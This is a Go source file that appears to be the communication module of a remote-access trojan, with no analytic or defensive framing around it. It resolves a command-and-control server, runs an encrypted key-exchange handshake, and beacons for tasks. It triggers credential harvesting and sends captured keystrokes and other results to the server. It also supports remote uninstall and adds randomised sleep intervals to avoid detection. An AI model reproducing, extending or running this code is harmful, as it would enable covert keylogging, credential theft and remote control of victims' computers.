package main

import (
	"bytes"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/hkdf"
)

func resolveC2() string {
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Get(RESOLVER_URL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(body))
}

func performHandshake() {
	if C2_ADDRESS == "" {
		C2_ADDRESS = resolveC2()
		if C2_ADDRESS == "" {
			return
		}
	}

	curve := ecdh.P256()
	privKey, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		queueError("handshake_keygen")
		return
	}
	pubKey := privKey.PublicKey()

	packet := Task{
		Type:      "handshake",
		PublicKey: base64.StdEncoding.EncodeToString(pubKey.Bytes()),
	}
	jsonPacket, err := json.Marshal(packet)
	if err != nil {
		queueError("handshake_marshal")
		return
	}

	encryptedPacket, err := EncryptStatic(string(jsonPacket))
	if err != nil {
		queueError("handshake_encrypt")
		return
	}

	client := &http.Client{Timeout: 10 * time.Second, Transport: C2_TRANSPORT}
	req, err := http.NewRequest("POST", C2_ADDRESS, bytes.NewBuffer([]byte(encryptedPacket)))
	if err != nil {
		queueError("handshake_req")
		return
	}
	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)

	resp, err := client.Do(req)
	if err != nil {
		queueError("handshake_conn")
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		queueError("handshake_read")
		return
	}
	decryptedResp, err := DecryptStatic(string(bodyBytes))
	if err != nil {
		queueError("handshake_decrypt")
		return
	}

	var handshakeResp HandshakeResponse
	json.Unmarshal([]byte(decryptedResp), &handshakeResp)

	serverPubBytes, err := base64.StdEncoding.DecodeString(handshakeResp.PublicKey)
	if err != nil {
		queueError("handshake_pubkey")
		return
	}
	serverPub, err := curve.NewPublicKey(serverPubBytes)
	if err != nil {
		queueError("handshake_pubkey")
		return
	}

	sharedSecret, err := privKey.ECDH(serverPub)
	if err != nil {
		queueError("handshake_ecdh")
		return
	}

	hkdfReader := hkdf.New(sha256.New, sharedSecret, nil, []byte("handshake data"))
	derivedKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdfReader, derivedKey); err != nil {
		queueError("handshake_hkdf")
		return
	}

	SESSION_KEY = derivedKey
}

func beacon() {
	if C2_ADDRESS == "" {
		C2_ADDRESS = resolveC2()
		if C2_ADDRESS == "" {
			return
		}
	}
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}

	req, err := http.NewRequest("GET", C2_ADDRESS, nil)
	if err != nil {
		C2_ADDRESS = ""
		return
	}
	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Conn Error")
		C2_ADDRESS = ""
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			queueError("beacon_read")
			return
		}
		encryptedTask := string(bodyBytes)
		decryptedJson, err := Decrypt(encryptedTask)
		if err != nil {
			queueError("beacon_decrypt")
			return
		}

		var task Task
		json.Unmarshal([]byte(decryptedJson), &task)

		KEYLOG_MUTEX.Lock()
		var keylogs string
		if KEYLOG_BUFFER.Len() > 0 {
			keylogs = KEYLOG_BUFFER.String()
			KEYLOG_BUFFER.Reset()
		}
		KEYLOG_MUTEX.Unlock()

		if task.Type == "harvest" {
			harvestCredentials()
			if keylogs != "" {
				res := Result{Type: "keylog", Data: keylogs}
				res = attachErrors(res)
				jsonResult, err := json.Marshal(res)
				if err == nil {
					encryptedResult, err := Encrypt(string(jsonResult))
					if err == nil {
						postResult(encryptedResult)
					}
				}
			}
		} else {
			result := handleTask(task)
			if keylogs != "" {
				result.Keylogs = keylogs
			}
			result = attachErrors(result)
			jsonResult, err := json.Marshal(result)
			if err != nil {
				queueError("beacon_marshal")
				return
			}
			encryptedResult, err := Encrypt(string(jsonResult))
			if err != nil {
				queueError("beacon_encrypt")
				return
			}
			postResult(encryptedResult)
		}

		if task.Type == "uninstall" {
			releaseMutex()
			os.Exit(0)
		}
	} else if resp.StatusCode == 204 {
		fmt.Print(".")
	}
}

func sendErrorLog(msg string) {
	result := Result{Type: "text", Data: msg}
	result = attachErrors(result)
	jsonResult, err := json.Marshal(result)
	if err != nil {
		queueError("sendlog_marshal")
		return
	}
	encryptedResult, err := Encrypt(string(jsonResult))
	if err != nil {
		queueError("sendlog_encrypt")
		return
	}
	postResult(encryptedResult)
}

func postResult(encryptedData string) {
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}
	req, err := http.NewRequest("POST", C2_ADDRESS, bytes.NewBuffer([]byte(encryptedData)))
	if err != nil {
		queueError("post_req")
		return
	}
	req.Header.Set("User-Agent", USER_AGENT)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)
	client.Do(req)
}

func sleepWithJitter() {
	n, _ := rand.Int(rand.Reader, big.NewInt(100))
	drift := float64(SLEEP_TIME) * JITTER
	randomDrift := (float64(n.Int64()) / 100.0 * 2 * drift) - drift
	time.Sleep(time.Duration(float64(SLEEP_TIME) + randomDrift))
}
